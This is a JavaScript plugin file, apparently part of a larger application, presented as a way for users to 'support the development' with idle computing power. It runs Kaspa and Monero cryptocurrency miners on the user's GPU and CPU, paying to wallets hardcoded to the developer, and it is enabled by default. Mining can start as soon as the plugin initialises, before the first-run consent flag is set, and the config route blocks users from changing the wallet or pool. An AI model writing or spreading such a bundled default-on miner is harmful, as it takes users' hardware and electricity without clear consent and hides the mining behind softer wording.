const EventEmitter = require('events');
const path = require('path');
const fs = require('fs').promises;
const IdleDetector = require('./utils/idle-detector');
const ProcessManager = require('./utils/process-manager');

/**
 * Support the Development Plugin
 * 
 * Allows users to contribute computing power during idle time to support development.
 * Features:
 * - Idle detection (system idle, CPU/GPU load monitoring)
 * - GPU contribution (Kaspa kHeavyHash)
 * - CPU contribution (Monero RandomX)
 * - Safety mechanisms (temperature, load limits)
 * - Simple and Advanced UI modes
 * - Donation page with wallet addresses
 */
class SupportDevPlugin extends EventEmitter {
    constructor(api) {
        super();
        this.api = api;
        
        // Components
        this.idleDetector = null;
        this.processManager = null;
        
        // Plugin state
        this.isActive = false;
        this.isFirstRun = true;
        
        // Default configuration
        this.config = {
            enabled: true,              // Feature enabled by default (user can disable)
            firstRunCompleted: false,   // Track if user has seen first-run popup
            mode: 'simple',             // 'simple' or 'advanced'
            
            // Idle detection settings
            idle: {
                startAfterSeconds: 120, // Start after 2 minutes of idle
                cpuThreshold: 20,       // Start only if CPU < 20%
                gpuThreshold: 20        // Start only if GPU < 20%
            },
            
            // GPU contribution settings
            gpu: {
                enabled: true,
                maxLoad: 34,            // Max 34% GPU load
                pool: 'stratum+tcp://pool.woolypooly.com:3112',
                wallet: 'kaspa:qpra2nvnhty2ec5u5zyenmgjvst9nyacztke42z0j598hekwt5rdqq46jr4sp3'
            },
            
            // CPU contribution settings
            cpu: {
                enabled: true,
                maxLoad: 34,            // Max 34% CPU load
                pool: 'pool.supportxmr.com:3333',
                wallet: '41ibGEw2aC7HySfkWT2Tky4yGReW4tQzMZvguCLfghSvADaXwLNmdpqa9xKxent5VB4oKfCde55gX44noxdT6iELR1fr2cf'
            },
            
            // Safety settings
            safety: {
                maxTemperature: 80,     // Max 80°C
                checkInterval: 30000    // Check every 30 seconds
            }
        };
        
        // Hardcoded donation addresses (immutable)
        this.DONATION_ADDRESSES = Object.freeze({
            paypal: 'rainer@dominik.in',
            monero: '41ibGEw2aC7HySfkWT2Tky4yGReW4tQzMZvguCLfghSvADaXwLNmdpqa9xKxent5VB4oKfCde55gX44noxdT6iELR1fr2cf',
            litecoin: 'LUYpdab8jmoeA4gB8Y39crs4JkL6EMofcY',
            ethereum: '0x0a13257f5d25f6a42b1f99e25b7fdb6093e63592',
            kaspa: 'kaspa:qpra2nvnhty2ec5u5zyenmgjvst9nyacztke42z0j598hekwt5rdqq46jr4sp3'
        });
    }

    /**
     * Initialize the plugin
     */
    async init() {
        this.api.log('Initializing Support the Development Plugin...', 'info');

        try {
            // Load configuration from database
            await this.loadConfig();
            
            // Initialize components
            this.idleDetector = new IdleDetector({
                info: (msg) => this.api.log(msg, 'info'),
                error: (msg) => this.api.log(msg, 'error'),
                debug: (msg) => this.api.log(msg, 'debug')
            });
            
            this.processManager = new ProcessManager({
                info: (msg) => this.api.log(msg, 'info'),
                error: (msg) => this.api.log(msg, 'error'),
                debug: (msg) => this.api.log(msg, 'debug')
            });
            
            // Configure components
            this.idleDetector.configure({
                idleTimeSeconds: this.config.idle.startAfterSeconds,
                cpuThresholdPercent: this.config.idle.cpuThreshold,
                gpuThresholdPercent: this.config.idle.gpuThreshold
            });
            
            this.processManager.configure({
                gpu: this.config.gpu,
                cpu: this.config.cpu,
                safety: this.config.safety
            });
            
            // Register routes
            this.registerRoutes();
            
            // Register Socket.IO handlers
            this.registerSocketHandlers();
            
            // Start idle detection if enabled
            if (this.config.enabled) {
                this.startIdleDetection();
            }
            
            this.api.log('✅ Support the Development Plugin initialized', 'info');
            
        } catch (error) {
            this.api.log(`Error initializing Support Dev Plugin: ${error.message}`, 'error');
            throw error;
        }
    }

    /**
     * Destroy the plugin
     */
    async destroy() {
        this.api.log('Destroying Support the Development Plugin...', 'info');
        
        // Stop all processes
        await this.stopContribution();
        
        // Stop idle detection
        if (this.idleDetector) {
            this.idleDetector.stop();
        }
        
        this.api.log('Support the Development Plugin destroyed', 'info');
    }

    /**
     * Load configuration from database
     */
    async loadConfig() {
        try {
            const savedConfig = await this.api.getConfig('support-dev-config');
            if (savedConfig) {
                // Merge saved config with defaults
                this.config = {
                    ...this.config,
                    ...savedConfig,
                    idle: { ...this.config.idle, ...(savedConfig.idle || {}) },
                    gpu: { ...this.config.gpu, ...(savedConfig.gpu || {}) },
                    cpu: { ...this.config.cpu, ...(savedConfig.cpu || {}) },
                    safety: { ...this.config.safety, ...(savedConfig.safety || {}) }
                };
            }
        } catch (error) {
            this.api.log(`Error loading config: ${error.message}`, 'error');
        }
    }

    /**
     * Save configuration to database
     */
    async saveConfig() {
        try {
            await this.api.setConfig('support-dev-config', this.config);
            this.api.log('Configuration saved', 'debug');
        } catch (error) {
            this.api.log(`Error saving config: ${error.message}`, 'error');
        }
    }

    /**
     * Register HTTP routes
     */
    registerRoutes() {
        // Get current status
        this.api.registerRoute('GET', '/api/support-dev/status', async (req, res) => {
            try {
                const status = {
                    enabled: this.config.enabled,
                    isActive: this.isActive,
                    firstRunCompleted: this.config.firstRunCompleted,
                    mode: this.config.mode,
                    idle: this.idleDetector ? this.idleDetector.getState() : null,
                    processes: this.processManager ? this.processManager.getState() : null,
                    donationAddresses: this.DONATION_ADDRESSES
                };
                res.json(status);
            } catch (error) {
                res.status(500).json({ error: error.message });
            }
        });

        // Get configuration
        this.api.registerRoute('GET', '/api/support-dev/config', async (req, res) => {
            try {
                // Don't expose sensitive pool/wallet info in simple mode
                const publicConfig = {
                    enabled: this.config.enabled,
                    firstRunCompleted: this.config.firstRunCompleted,
                    mode: this.config.mode,
                    idle: this.config.idle,
                    gpu: {
                        enabled: this.config.gpu.enabled,
                        maxLoad: this.config.gpu.maxLoad
                    },
                    cpu: {
                        enabled: this.config.cpu.enabled,
                        maxLoad: this.config.cpu.maxLoad
                    },
                    safety: this.config.safety
                };
                res.json(publicConfig);
            } catch (error) {
                res.status(500).json({ error: error.message });
            }
        });

        // Update configuration
        this.api.registerRoute('POST', '/api/support-dev/config', async (req, res) => {
            try {
                const updates = req.body;
                
                // Update config (but preserve hardcoded wallet addresses)
                if (updates.enabled !== undefined) {
                    this.config.enabled = !!updates.enabled;
                }
                if (updates.mode !== undefined && ['simple', 'advanced'].includes(updates.mode)) {
                    this.config.mode = updates.mode;
                }
                if (updates.idle) {
                    this.config.idle = { ...this.config.idle, ...updates.idle };
                    this.idleDetector.configure({
                        idleTimeSeconds: this.config.idle.startAfterSeconds,
                        cpuThresholdPercent: this.config.idle.cpuThreshold,
                        gpuThresholdPercent: this.config.idle.gpuThreshold
                    });
                }
                if (updates.gpu) {
                    this.config.gpu = { 
                        ...this.config.gpu, 
                        ...updates.gpu,
                        // Preserve hardcoded values
                        wallet: this.DONATION_ADDRESSES.kaspa,
                        pool: this.config.gpu.pool
                    };
                    this.processManager.configure({ gpu: this.config.gpu });
                }
                if (updates.cpu) {
                    this.config.cpu = { 
                        ...this.config.cpu, 
                        ...updates.cpu,
                        // Preserve hardcoded values
                        wallet: this.DONATION_ADDRESSES.monero,
                        pool: this.config.cpu.pool
                    };
                    this.processManager.configure({ cpu: this.config.cpu });
                }
                if (updates.safety) {
                    this.config.safety = { ...this.config.safety, ...updates.safety };
                    this.processManager.configure({ safety: this.config.safety });
                }
                
                await this.saveConfig();
                
                // Restart idle detection if enabled state changed
                if (updates.enabled !== undefined) {
                    if (this.config.enabled) {
                        this.startIdleDetection();
                    } else {
                        await this.stopContribution();
                        this.idleDetector.stop();
                    }
                }
                
                // Emit update to clients
                this.emitStatusUpdate();
                
                res.json({ success: true, config: this.config });
            } catch (error) {
                res.status(500).json({ error: error.message });
            }
        });

        // Mark first run as completed
        this.api.registerRoute('POST', '/api/support-dev/first-run-complete', async (req, res) => {
            try {
                this.config.firstRunCompleted = true;
                await this.saveConfig();
                res.json({ success: true });
            } catch (error) {
                res.status(500).json({ error: error.message });
            }
        });

        // Manual start (for testing or manual control)
        this.api.registerRoute('POST', '/api/support-dev/start', async (req, res) => {
            try {
                await this.startContribution();
                res.json({ success: true });
            } catch (error) {
                res.status(500).json({ error: error.message });
            }
        });

        // Manual stop
        this.api.registerRoute('POST', '/api/support-dev/stop', async (req, res) => {
            try {
                await this.stopContribution();
                res.json({ success: true });
            } catch (error) {
                res.status(500).json({ error: error.message });
            }
        });

        // Get donation addresses
        this.api.registerRoute('GET', '/api/support-dev/donations', async (req, res) => {
            res.json(this.DONATION_ADDRESSES);
        });
    }

    /**
     * Register Socket.IO handlers
     */
    registerSocketHandlers() {
        const io = this.api.getSocketIO();
        
        io.on('connection', (socket) => {
            // Send current status on connection
            socket.emit('support-dev:status', this.getStatus());
            
            // Handle status request
            socket.on('support-dev:request-status', () => {
                socket.emit('support-dev:status', this.getStatus());
            });
        });
    }

    /**
     * Start idle detection
     */
    startIdleDetection() {
        if (!this.config.enabled) {
            return;
        }

        this.idleDetector.start(async (isIdle) => {
            if (isIdle && !this.isActive) {
                // System became idle, start contribution
                await this.startContribution();
            } else if (!isIdle && this.isActive) {
                // System became active, stop contribution
                await this.stopContribution();
            }
        });
    }

    /**
     * Start computing contribution
     */
    async startContribution() {
        if (this.isActive) {
            return;
        }

        this.api.log('Starting compute contribution', 'info');
        this.isActive = true;
        
        try {
            await this.processManager.start();
            this.emitStatusUpdate();
        } catch (error) {
            this.api.log(`Error starting contribution: ${error.message}`, 'error');
            this.isActive = false;
        }
    }

    /**
     * Stop computing contribution
     */
    async stopContribution() {
        if (!this.isActive) {
            return;
        }

        this.api.log('Stopping compute contribution', 'info');
        this.isActive = false;
        
        try {
            await this.processManager.stop();
            this.emitStatusUpdate();
        } catch (error) {
            this.api.log(`Error stopping contribution: ${error.message}`, 'error');
        }
    }

    /**
     * Get current status
     */
    getStatus() {
        return {
            enabled: this.config.enabled,
            isActive: this.isActive,
            firstRunCompleted: this.config.firstRunCompleted,
            mode: this.config.mode,
            idle: this.idleDetector ? this.idleDetector.getState() : null,
            processes: this.processManager ? this.processManager.getState() : null
        };
    }

    /**
     * Emit status update to all clients
     */
    emitStatusUpdate() {
        const io = this.api.getSocketIO();
        io.emit('support-dev:status', this.getStatus());
    }
}

module.exports = SupportDevPlugin;
